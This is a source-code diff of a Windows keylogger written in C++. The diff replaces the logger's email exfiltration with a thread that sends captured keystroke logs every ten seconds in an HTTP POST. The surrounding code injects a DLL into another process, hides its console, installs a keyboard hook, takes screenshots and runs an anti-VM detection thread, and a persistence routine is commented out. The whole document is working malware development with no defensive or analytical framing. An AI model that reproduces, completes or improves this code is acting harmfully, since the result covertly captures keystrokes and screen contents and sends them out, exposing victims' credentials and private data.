@@ -5,7 +5,7 @@
 #include "../include/Screenshot.h"
 #include "../include/anti_eyes.h"
 #include "../include/stealth.h"
-#include "../include/memory.h"
+#include "../include/post_request.h"
 #include "../include/inject.h"
 
 
@@ -28,12 +28,22 @@ DWORD WINAPI detect_process_thread(LPVOID lpParam) {
     }
 }
 
-DWORD WINAPI email_thread(LPVOID lpParam) {
+DWORD WINAPI post_thread(LPVOID lpParam) {
     while (true) {
-        // Send email every 5 minutes (300000 milliseconds)
-        Sleep(10000);
-        save_logs_to_file();
-        send_email();
+        Sleep(10000); // (10 seconds)
+
+        std::vector<char> logs_to_send;
+        {
+            std::lock_guard lock(g_logMutex);
+            if (g_plainLogs.empty()) continue;
+            logs_to_send.swap(g_plainLogs);
+        }
+
+        if (!send_via_post(logs_to_send)) {
+            // If failed, put logs back
+            std::lock_guard lock(g_logMutex);
+            g_plainLogs.insert(g_plainLogs.end(), logs_to_send.begin(), logs_to_send.end());
+        }
     }
     return 0;
 }
@@ -44,21 +54,21 @@ int main() {
     if (pid != 0) inject_dll(pid, dllPath.c_str());
 
     hide_console();
-    persistence();
+    //persistence();
 
     install_hook(); // Install the key hook
 
 
-    HANDLE hEmailThread = CreateThread(
+    HANDLE hPostThread = CreateThread(
         NULL, // default security attributes
         0, // default stack size
-        email_thread, // thread function for email
+        post_thread, // thread function for email
         NULL, // argument to thread function
         0, // default creation flags
         NULL); // returns the thread identifier
 
-    if (hEmailThread == NULL) {
-        std::cerr << "Failed to create email thread." << std::endl;
+    if (hPostThread == NULL) {
+        std::cerr << "Failed to create POST request thread." << std::endl;
         return 1;
     }
 
@@ -94,12 +104,12 @@ int main() {
     uninstall_hook();
     WaitForSingleObject(hScreenshotThread, INFINITE); // Ensure screenshot thread finishes
     WaitForSingleObject(hdetectProcessThread, INFINITE); // Ensure Anti-VM thread finishes
-    WaitForSingleObject(hEmailThread, INFINITE);
+    WaitForSingleObject(hPostThread, INFINITE);
 
     // Close thread handles
     CloseHandle(hScreenshotThread);
     CloseHandle(hdetectProcessThread);
-    CloseHandle(hEmailThread);
+    CloseHandle(hPostThread);
 
     return 0;
 }
